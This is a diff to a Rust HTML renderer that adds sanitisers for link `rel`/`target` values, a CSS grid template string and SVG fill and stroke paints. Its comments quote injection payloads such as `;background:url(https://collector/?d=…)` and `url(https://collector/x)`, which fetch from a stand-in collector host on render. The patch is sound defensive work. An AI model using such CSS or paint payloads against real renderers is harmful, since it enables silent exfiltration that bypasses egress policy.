@@ -55,6 +55,9 @@ use super::egress::{
 };
 use super::html::{Attr, AttrVal, el, entity_encode, escape_attr, escape_text, text_el, void_el};
 use super::markdown::to_html_with_egress as markdown_to_html_with_egress;
+use super::sanitize::{
+    CSS_REFUSAL_ATTRIBUTE, is_safe_css_value, sanitize_link_anchor, sanitize_paint_value,
+};
 
 fn s(v: impl Into<String>) -> AttrVal {
     AttrVal::Str(v.into())
@@ -890,11 +893,21 @@ fn render_kind(ctx: &Ctx<'_>, node: &Node, semantic_attrs: &[Attr]) -> String {
                 el("span", &attrs, &anchor)
             } else {
                 let mut attrs: Vec<Attr> = vec![("class", s("fuaran-link")), ("href", s(href))];
-                if let Some(rel) = &spec.rel {
-                    attrs.push(("rel", s(rel.clone())));
+                // `rel` and `target` were emitted VERBATIM, so a decoded tree
+                // could write `rel="opener"` on a `_blank` link and re-enable
+                // `window.opener`, or name an arbitrary browsing context in
+                // `target`. Both are closed token sets now, resolved TOGETHER
+                // because the `rel` rule depends on the sanitised target:
+                // `noopener noreferrer` is FORCED on `_blank` whether or not the
+                // document asked. Same grammar, same order, same bytes as every
+                // other host.
+                let (safe_target, safe_rel) =
+                    sanitize_link_anchor(spec.target.as_deref(), spec.rel.as_deref());
+                if let Some(rel) = safe_rel {
+                    attrs.push(("rel", s(rel)));
                 }
-                if let Some(target) = &spec.target {
-                    attrs.push(("target", s(target.clone())));
+                if let Some(target) = safe_target {
+                    attrs.push(("target", s(target)));
                 }
                 if spec.download {
                     attrs.push(("download", AttrVal::Flag(true)));
@@ -1668,21 +1681,37 @@ fn render_box(ctx: &Ctx<'_>, spec: &BoxSpec) -> String {
         template_columns,
     } = &spec.layout
     {
-        let template = template_columns
+        let declared_template = template_columns
             .clone()
             .unwrap_or_else(|| format!("repeat({cols}, 1fr)"));
+        // `templateColumns` is a free string on the wire that lands verbatim in
+        // a `style` attribute — the one slot in this renderer where a decoded
+        // document writes CSS. Unsanitised, a value carrying
+        // `;background:url(https://collector/?d=…)` closed the declaration,
+        // opened a second one, and fetched on RENDER with no user act, outside
+        // the egress policy that governs every href and src in the same
+        // document, while the React client dropped the identical value silently.
+        // The rule is the shared emission grammar, so every host now emits the
+        // same bytes for the same tree, and a refusal is MARKED on the element
+        // rather than being silent.
+        let template_ok = is_safe_css_value(&declared_template);
+        let template = if template_ok {
+            declared_template
+        } else {
+            String::new()
+        };
         let grid_style = match gap {
             Some(gap) => format!("grid-template-columns:{template};gap:{gap}px"),
             None => format!("grid-template-columns:{template}"),
         };
-        return el(
-            "div",
-            &[
-                ("class", s(format!("fuaran-layout-grid{brk}"))),
-                ("style", s(grid_style)),
-            ],
-            &render_children(ctx, &spec.children),
-        );
+        let mut grid_attrs: Vec<Attr> = vec![
+            ("class", s(format!("fuaran-layout-grid{brk}"))),
+            ("style", s(grid_style)),
+        ];
+        if !template_ok {
+            grid_attrs.push((CSS_REFUSAL_ATTRIBUTE, s("grid-template-columns")));
+        }
+        return el("div", &grid_attrs, &render_children(ctx, &spec.children));
     }
     if let BoxLayout::Masonry { cols, gap } = &spec.layout {
         // WIRE_FORMAT §3.6.7 — column-fill, realised with the CSS multi-column
@@ -2081,7 +2110,19 @@ fn draw_style_attrs(style: &crate::wire::DrawStyle, default_fill_none: bool) -> 
     match &style.fill {
         Some(b) => {
             if let Some(v) = draw_static_string(b) {
-                out.push_str(&format!(" fill=\"{}\"", escape_attr(&v)));
+                // A paint is a CLOSED colour grammar, not a free string.
+                // `escape_attr` makes a value safe as MARKUP and says nothing
+                // about what it MEANS, and `url(https://collector/x)` in an SVG
+                // `fill` names a paint server the user agent FETCHES — on
+                // render, with no user act, outside the egress policy. It also
+                // contains no character the generic CSS rule forbids, which is
+                // why these two slots need a positive grammar. A refused paint
+                // emits `none`: an empty `fill` INHERITS the enclosing group's
+                // paint instead of clearing it.
+                out.push_str(&format!(
+                    " fill=\"{}\"",
+                    escape_attr(&sanitize_paint_value(&v))
+                ));
             }
         }
         None => {
@@ -2094,7 +2135,10 @@ fn draw_style_attrs(style: &crate::wire::DrawStyle, default_fill_none: bool) -> 
         out.push_str(&format!(" opacity=\"{}\"", draw_num(v)));
     }
     if let Some(v) = style.stroke.as_ref().and_then(draw_static_string) {
-        out.push_str(&format!(" stroke=\"{}\"", escape_attr(&v)));
+        out.push_str(&format!(
+            " stroke=\"{}\"",
+            escape_attr(&sanitize_paint_value(&v))
+        ));
     }
     if let Some(v) = style.stroke_width.as_ref().and_then(draw_static_number) {
         out.push_str(&format!(" stroke-width=\"{}\"", draw_num(v)));
